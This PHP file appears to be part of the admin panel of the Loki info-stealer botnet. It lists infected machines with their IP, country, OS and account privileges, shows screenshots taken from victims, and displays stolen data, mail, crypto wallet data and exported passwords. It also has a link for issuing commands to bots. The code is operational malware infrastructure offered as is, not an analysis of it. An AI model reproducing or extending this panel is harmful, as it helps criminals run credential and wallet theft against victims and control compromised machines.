<?php

if(strlen($Option_))
{
    if($Option_ == 'flush')
    {
		$Txt = NULL;
		if(isset($_REQUEST['st']) && strlen(trim($_REQUEST['st'])))
			$Txt = trim($_REQUEST['st']);
		
        if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
            $LokiDBCon->DeleteReport(trim($_REQUEST['id']));
        else if(isset($_REQUEST['rid']) && strlen(trim($_REQUEST['rid'])))
            $LokiDBCon->DeleteReport(NULL, trim($_REQUEST['rid']));
        else
            $LokiDBCon->DeleteReport();
    }
    if($Option_ == 'exportpw')
    {
        if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
            $LokiDBCon->ExportPW_(trim($_REQUEST['id']));
        else
            $LokiDBCon->ExportPW_();
    }
    else if($Option_ == 'view')
    {
        if(isset($_REQUEST['id']) && strlen(trim($_REQUEST['id'])))
        {
            $ReportDATA = $LokiDBCon->GetAllDataByID(trim($_REQUEST['id']));
       ?>
			<div class="row">
				<div class='col-md-2 sidebar'></div>
				<div class='col-md-8 col-md-offset-0'>
				<div align="center" class="">
					<div id="IMGMod" style="padding:10px;" class="modal" tabindex="-1" role="dialog">
						<div class="modal-content">
							<div class="modal-header"> <button type="button" class="close" data-dismiss="modal">&times;</button> <h4 class="modal-title"></h4> </div>
							<div id="modal-body" style="width: 90%;" class="modal-body"></div>
						</div>
					</div>
				</div>
				
	   				<div id="http_tool" style="padding-bottom:10px; padding-left: 34px;">
						<div class="form-inline" role="form">
							<a class="btn btn-default" type="button" href="<?php print $LINK_Download; ?>report&id=<?php print trim($_REQUEST['id']) ?>"><?php GetText_('report_export_all'); ?></a>
							<a class="btn btn-default" type="button" href="<?php print $LINK_Download; ?>report&id=<?php print trim($_REQUEST['id']) ?>&m=1"><?php GetText_('report_export_all_mark'); ?></a>
							<a class="btn btn-default" type="button" href="<?php print "?" . ACTVALUE_ . "=" . $Action . "&" . OPTVALUE_ . "=flush&rid=" .trim($_REQUEST['id']); ?>"><?php GetText_('report_export_delete'); ?></a>
							<a class="btn btn-default" type="button" href="<?php print "?" . ACTVALUE_ . "=" . $Action . "&" . OPTVALUE_ . "=exportpw&id=" .trim($_REQUEST['id']); ?>"><?php GetText_('report_exportpw'); ?></a>
						</div>
					</div>
				</div>
			</div>
					
			<div class="row">
				<div class='col-md-2 sidebar'></div>
				<div class='col-md-8 col-md-offset-0' align="center">
					<?php
							$DataImg = '';
							$ScreenIMG = TEMP_ . '/' . $ReportDATA['REPORT'][0]['report_guid'] . "_screen.png";
							if(file_exists ($ScreenIMG))
							{
								$DataImg = '<a href="#" id="'.$ScreenIMG.'" class="thumb_img"><img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" height="16" width="16" src="'.INCLUDE_.'/style/icon/screen.png"></a>';
							}
					
						$Table[] = array( GetText_('http_table_time', FALSE),  NowDate(NULL, $ReportDATA['REPORT'][0]['report_time']));
						$Table[] = array( GetText_('reportv_table_guid', FALSE),  '<a href="?' . ACTVALUE_ . '=report&st='.  $ReportDATA['REPORT'][0]['report_guid'].'">'.$ReportDATA['REPORT'][0]["report_guid"].'</a>');
						//$Table[] = array( GetText_('reportv_table_os', FALSE),  );
						$Table[] = array( GetText_('reportv_table_os', FALSE),  GetOSText($ReportDATA['REPORT'][0]['report_os']));
						
						$Table[] = array( GetText_('reportv_table_arc', FALSE),  $ReportDATA['REPORT'][0]['report_is_win64'] ? 'x64' : 'x32');
						$Table[] = array( GetText_('report_table_screen', FALSE),  $ReportDATA['REPORT'][0]['report_screen']);
						$Table[] = array( GetText_('reportv_table_acc', FALSE),  	GetAccountText($ReportDATA['REPORT'][0]['report_account']));
						$Table[] = array( GetText_('reportv_table_elev', FALSE), AccountElevated($ReportDATA['REPORT'][0]['report_account']) ? 'Yes' : 'No');
						$Table[] = array( GetText_('report_table_ip', FALSE), '<a href="?' . ACTVALUE_ . '=report&st='. $ReportDATA['REPORT'][0]["report_ip"].'">'.$ReportDATA['REPORT'][0]["report_ip"].'</a>');
						$Table[] = array( GetText_('reportv_table_country', FALSE), GetCountryName($ReportDATA['REPORT'][0]['report_country']) . ' (<a href="?' . ACTVALUE_ . '=report&sc='. $ReportDATA['REPORT'][0]["report_country"].'">'.$ReportDATA['REPORT'][0]["report_country"].'</a>)');
						$Table[] = array( GetText_('reportv_table_hash', FALSE),  $ReportDATA['REPORT'][0]['report_hash']);
						$Table[] = array( GetText_('table_bot_name', FALSE),  stripslashes ($ReportDATA['REPORT'][0]['report_name']));
						$Table[] = array( GetText_('main_total_data', FALSE),  $ReportDATA['DATA']["NumOfData"] + $ReportDATA['WALLET']["NumOfData"]);
						
						if(MODULE_LOADER)
						{
							$Table[] = array( GetText_('report_view_set_command', FALSE),  '<a href="?' . ACTVALUE_ . '=command&bc='.  $ReportDATA['REPORT'][0]['report_guid'].'">Set</a>');
						
							$BotINfo = $LokiDBCon->GetBots(0, 1, NULL, $ReportDATA['REPORT'][0]['report_guid']);
							if($BotINfo != NULL && isset($BotINfo[0]["bot_last_online"]))
							{
								$Table[] = array( GetText_('report_view_last_online', FALSE),  NowDate(NULL, $BotINfo[0]['bot_last_online']));
							}
						}
						
						if(strlen($DataImg))
							$Table[] = array( GetText_('main_table_screen', FALSE),  $DataImg);
						
						PrintTable(GetText_('reportv_table_data', FALSE) . " - v." . GetVersion($ReportDATA['REPORT'][0]['report_version']) . " (".'<a href="?' . ACTVALUE_ . '=report&sb='.$ReportDATA['REPORT'][0]['report_bin_id'].'">'.$ReportDATA['REPORT'][0]['report_bin_id'].'</a>'.")", $Table, $SizeA = "60%", $SizeB = "40%");
						unset($Table);
						
						$Lasts_ = $ReportDATA['DATA'];
						if($Lasts_ != NULL && isset($Lasts_["NumOfData"]) && $Lasts_["NumOfData"] > 0)
						{
							$Table = array();
							
							for($i = 0; $i < $Lasts_["NumOfData"]; $i++)
							{
								$DataRead = '';
								if($Lasts_[$i]["data_client"] == 202)
								{
									$Dr_Title = '<img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" src="'.INCLUDE_.'/style/icon/read.png" alt="" height="16" width="16">';
									$DataRead = '<a target="blank" href="'. "?" . ACTVALUE_ . "=download&opti=datar&id=" . $Lasts_[$i]["data_id"] . '">' . $Dr_Title . '</a>';
								}
						
								if(isset($Lasts_[$i]["data_client"]))
								{
									$Text = '';
									if($Lasts_[$i]["data_type"] == "datadl")
									{
										$Name = explode("|", $Lasts_[$i]["data_text"]);
										$Text = FormatDatadl(FormatShort($Name[0]), $Lasts_[$i]["data_type"], $Lasts_[$i]["data_id"]) . $DataRead;
									}
									else if($Lasts_[$i]["data_type"] == "mail")
									{
										$Text = FormatShort(FormatMail($Lasts_[$i]["data_text"]));
									}
									else
									{
										$Text = FormatShort($Lasts_[$i]["data_text"]);
									}
										
									
									$Table[] = array( $Text, FormatIcon($Lasts_[$i]["data_client"]) );
								}
							}
							
							PrintTable(GetText_('main_last_data', FALSE), $Table, "70%", "30%");
							$Table  = NULL;
							$Lasts_ = NULL;
						}
						
						$Wallets_ = $ReportDATA['WALLET'];
						if($Wallets_ != NULL && sizeof($Wallets_) > 0 && isset($Wallets_["NumOfData"]) && $Wallets_["NumOfData"] > 0)
						{
							$Table = array();
							
							for($i = 0; $i < $Wallets_["NumOfData"]; $i++)
							{
								if(isset($Wallets_[$i]["wallet_name"]))
								{
									$Table[] = array
											   ( FormatDatadl(FormatShort($Wallets_[$i]["wallet_name"]), 'wallet', $Wallets_[$i]["wallet_name"]), FormatIcon($Wallets_[$i]["wallet_client"], TRUE) );
								}
							}
							
							PrintTable(GetText_('main_last_wallet', FALSE), $Table, "70%", "30%");
							$Table 	  = NULL;
							$Wallets_ = NULL;
						}
					?>
						
				</div>
				<div class='col-md-2 sidebar'></div>
			</div>
		</div>
	</div>
</body>

</html>
						
						<?php
					}
					
					die_();
				}
			}
			
	$Text = $SearctTXT = NULL;
	$PageSearch = '';
	$DeleteTxt = GetText_('http_delete_all', FALSE);

	if(isset($_REQUEST['st']))
	{
		$Text =  trim($_REQUEST['st']);
		$PageSearch = '&st=' . $Text;
		$SearctTXT = array("text", $Text, "");
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else  if(isset($_REQUEST['sb']))
	{
		$Text =  trim($_REQUEST['sb']);
		$PageSearch = '&sb=' . $Text;
		$SearctTXT = array("text", $Text, "");
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
	else  if(isset($_REQUEST['sc']))
	{
		$Text =  trim($_REQUEST['sc']);
		$PageSearch = '&sc=' . $Text;
		$SearctTXT = array("text", $Text, "");
		$DeleteTxt = GetText_('http_delete_selected', FALSE);
	}
			$DataTable = NULL;
			if($Text != NULL)
			{
				if(isset($_REQUEST['sb']))
					$DataTable = $LokiDBCon->GetReport($StartFrom, $PageLimit, 'limit', NULL, NULL, NULL, $Text);
				else if(isset($_REQUEST['sc']))
					$DataTable = $LokiDBCon->GetReport($StartFrom, $PageLimit, 'limit', NULL, NULL, NULL, NULL, $Text);
				else
				{
					if(is_valid_ip($Text))
						$DataTable = $LokiDBCon->GetReport($StartFrom, $PageLimit, 'limit', NULL, NULL, $Text);
					else
						$DataTable = $LokiDBCon->GetReport($StartFrom, $PageLimit, 'limit', NULL, $Text);
				}

			}
			else
				$DataTable = $LokiDBCon->GetReport($StartFrom, $PageLimit);
			
			$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);

			if((isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] != 0) && isset($DataTable[0]["report_id"]))
			{
				$LINK_Delete = $LINK_Delete . $DataTable[0]["report_id"];
			}			
			?>

			<div class="row">
				<div class='col-md-0 sidebar'></div>
				<div class='col-md-12 main'>
					<div align="center" class="">
						<div id="IMGMod" style="padding:10px;" class="modal" tabindex="-1" role="dialog">
							<div class="modal-content">
								<div class="modal-header"> <button type="button" class="close" data-dismiss="modal">&times;</button> <h4 class="modal-title"></h4> </div>
								<div id="modal-body" style="width: 90%;" class="modal-body"></div>
							</div>
						</div>
					</div>
		<?php
		$Disabled = (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0);
		$TableMenu = 
		array
		(
			array($LINK_Delete.$PageSearch, $DeleteTxt, $Disabled),
			array("onvisible", "Show search", $Disabled),
			array('st', '?'.ACTVALUE_.'='.$Action, $Disabled, 'INPUT'),
			array(0, 'Search', $Disabled, 'FORMEND'),
			$SearctTXT,
		);

		GetTableMenu($TableMenu, $ID_ = "table_menu")
		?>
		<table class="table-condensed" data-toggle="table" data-toolbar="#table_menu" data-show-columns="true">
			<thead>
				<tr>
					<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('http_table_report'); ?></th>
					<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('reportv_table_guid'); ?></th>
					<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('command_table_binid'); ?></th>
					<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('table_bot_name'); ?></th>
					<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('report_table_ip'); ?></th>
					<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('http_table_data'); ?></th>
					<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('http_table_time'); ?></th>
				</tr>
			</thead>	
			<tbody>
				<?php
					$Counter = 0;
					while($DataTable["NumOfData"] > $Counter)
					{
							$DataImg = '';
							$ScreenIMG = TEMP_ . '/' . $DataTable[$Counter]['report_guid'] . "_screen.png";
							if(file_exists ($ScreenIMG))
							{
								$DataImg = '<a href="#" id="'.$ScreenIMG.'" class="thumb_img"><img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" height="16" width="16" src="'.INCLUDE_.'/style/icon/screen.png"></a>';
							}
						
						$Pre__ = '';
						if(strlen($DataTable[$Counter]["report_data"]))
							$Pre__ = ' (!)';
						
						print '
							<tr>
								<td><a href="'.$LINK_Report.$DataTable[$Counter]["report_id"].'">Open'.$Pre__.'</a></td>
								<td><a href="?' . ACTVALUE_ . '=report&st='. $DataTable[$Counter]['report_guid'].'">'.$DataTable[$Counter]["report_guid"].'</a>'.$DataImg.'</td>
								<td><a href="?' . ACTVALUE_ . '=report&sb='. $DataTable[$Counter]["report_bin_id"].'">'.$DataTable[$Counter]["report_bin_id"].'</a>'. " - v." . GetVersion($DataTable[$Counter]['report_version']).'</td>
								<td>'. stripslashes ($DataTable[$Counter]["report_name"]).'</td>
								<td><a href="?' . ACTVALUE_ . '=report&st='. $DataTable[$Counter]["report_ip"].'">'.$DataTable[$Counter]["report_ip"].'</a> (<a href="?' . ACTVALUE_ . '=report&sc='. $DataTable[$Counter]["report_country"].'">'.$DataTable[$Counter]["report_country"].'</a>)</td>
								<td>'.($DataTable[$Counter]["report_data_num"]+0 /*$DataTable[$Counter]["report_walletnum"]*/).'</td>
								<td>'.NowDate(NULL, $DataTable[$Counter]["report_time"]).'</td>
							</tr>';
						$Counter++;
					}
				?>
			</tbody>
		</table>
		<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch, $DataTable); ?>
	</div>
				<div class='col-md-1 sidebar'></div>
			</div>
			</div>
		</div>
	</div>
	</body>
</html>
